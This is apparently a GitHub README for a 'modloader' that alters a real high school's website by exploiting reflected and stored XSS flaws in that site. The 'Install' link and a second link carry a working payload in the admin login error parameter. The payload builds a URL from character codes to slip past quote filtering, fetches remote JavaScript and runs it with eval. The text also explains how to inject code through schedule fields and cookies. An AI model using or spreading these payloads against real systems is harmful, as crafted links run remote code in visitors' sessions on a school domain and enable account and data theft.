${{\color{#a80f1f}\Huge{\textsf{R}}}}{{\color{#a80d24}\Huge{\textsf{H}}}}{{\color{#a80c2a}\Huge{\textsf{S}}}}{{\color{#a80b2e}\Huge{\textsf{-}}}}{{\color{#a70c33}\Huge{\textsf{M}}}}{{\color{#a70d38}\Huge{\textsf{o}}}}{{\color{#a60f3c}\Huge{\textsf{d}}}}{{\color{#a51241}\Huge{\textsf{l}}}}{{\color{#a31445}\Huge{\textsf{o}}}}{{\color{#a21749}\Huge{\textsf{a}}}}{{\color{#a01a4d}\Huge{\textsf{d}}}}{{\color{#9e1d51}\Huge{\textsf{e}}}}{{\color{#9c2055}\Huge{\textsf{r}}}}$
<br><br>An extension for the RHS website allowing you to install plugins and code. This is done by taking advantage of multiple HTML injection bugs in the website.

Supported on every device. An electron app will also be added to the releases tab at some point.
The Modloader itself will automatically update, but the electron app might need some app level changes to push to releases

> [!WARNING]  
> ***-- COOKIES WILL NOT WORK ON DAYS WITHOUT SCHOOL --***

## Installing
<a href="https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,105,110,115,116,97,108,108,101,114,46,106,115)).then(response=>response.text()).then(d=>eval(d))</script>">
  <img src="images/rps-RHS-watch.png" width="100" height="100" alt="Click To Install">
</a><br><br>Click the circle.

## Features
- Completely custom theme/plugin support using js/css with headers for name, author, description, and version
- Saving state of enabled plugins/themes and loading them on site launch
- CTRL + Y keybind to wipe everything in the case of something going wrong or a mod goes haywire
- As this is unfinished, this is not the full list of features. more will be added soon.
  
## Planned (by priority)
- Store to one-click download mods
- Text editor allowing you to make and edit files without leaving the site
- A bunch of smaller mods
- Timer improvements
- Accounts? Would also make store better
- Electron app

## Making Mods
Mods were originally uploaded as files, so even if a user is installing from the store, you will need a file name. If this file ends in ``.css`` it is seen as a theme and embedded in the site, and if it ends with ``.js`` it is seen as a plugin, and evaluates javascript.<br>Inside a mod's code, the file will start with this code (optional, but highly reccomended):
```js
/**
 * @name Cool Mod
 * @author me 😎
 * @version 1.3
 * @description Bottom Text
*/
```
This allows you to have a proper name, author, version, and description, but making this optional allows everything made before this feature to be supported.
Not much more to it but i'll add more here soon

## OLD INSTALLATION METHOD

~~As of right now, while it is less automatic, copying the code manaully is much more stable than attempting to change the domain's cookies, so this is reccomended for the time being.~~
USE THE REGULAR INSTALLATION METHOD IT'S BETTER IN EVERY WAY

1. Go to the [RHS Modloader website](https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,105,110,115,116,97,108,108,101,114,46,106,115)).then(response=>response.text()).then(d=>eval(d))</script>) and click "Copy Code Manually".

2. Go back to the official RHS Website and edit your schedule. If school is not happening on that day, you can change the date by adding ``?date=(year)-(month)-(day)`` to the end of the URL. 

*Month and day must be two digit, so for example use "03" instead of "3"*

3. To the end of every period name, paste the code you have copied. If that period is not present on a day, the code for it will not run. While putting it on 3 or 4 periods would also work for most days, there are some days with weird schedules. If done correctly, you won't see the code again.

## How this works

> [!NOTE]  
> I want to preface this by saying this isn't illegal. That's usually the first thought for many when they realize the website has effectively been hacked, but that is ignoring the nature of this exploit: The user has to install this themself. This is client-sided. The school website is not effected in any way due to this, and you are loading the HTML exploit onto your own device. This can definetly be used for malicous intent, but I have zero intention of doing so with this project. I just want to enhance and improve the RHS website, and I have found a way to give that to everyone without a third party computer. Hopefully you do too.

I have found two ways to add HTML onto the RHS website:

- Through the admin website
- By storing HTML in cookies

These are both forms of XSS as they allow self script injection.

The admin login for the RHS Website lets you directly add code to it using the [URL's error message](https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=%3Ch1%3EHello%20RHS!%3C/h1%3E),
and the main website allows it through the schedule tab, which just adds it on as plain text. This is also stored as cookies instead of in the URL, where your schedule is also stored.

While both of these don't like it when you add code directly (they cancel quotes), making strings from char codes is a very nice alternative and runs well.
